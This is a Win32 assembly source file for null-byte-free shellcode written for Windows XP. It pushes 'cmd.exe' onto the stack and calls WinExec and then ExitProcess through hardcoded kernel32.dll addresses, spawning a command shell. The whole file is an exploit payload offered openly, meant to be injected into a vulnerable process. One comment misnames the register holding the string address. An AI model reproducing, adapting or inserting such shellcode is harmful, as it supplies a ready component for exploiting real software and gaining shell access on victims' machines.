;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 1) This shellcode will spawn a cmd.exe
; 2) Null-bytes free
; 3) This shellcode was developed using a Windows XP kernel32.dll Winexec address 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; Author: lem0nSec_
; Date: 30/04/2022
; Lang: win32 Assembly

BITS 32

global _start

xor ebx, ebx
push ebx			; zeroing out ebx and pushing it
push 0x6578652e				; pushing exe.
xor edx, edx
mov edx, 0x01656e64
sub edx, 0x01010101
push edx			; pushing cmd --> null-byte-free 'dmc' obtained with some arithmetic ops in edx
mov ecx, esp			; storing addr of cmd.exe into edx and pushing it
push ecx
push 1			; pushing command line arg 2
push ecx
mov ebx, 0x7C8623AD
call ebx			; storing Winexec func (kernel32.dll) into ebx, then calling it
xor ebx, ebx
push ebx			; pushing 0 onto the stack as ExitProcess (kernel32.dll) arg
mov eax, 0x7C81CAFA
jmp eax			; storing ExitProcess into eax and jumping to it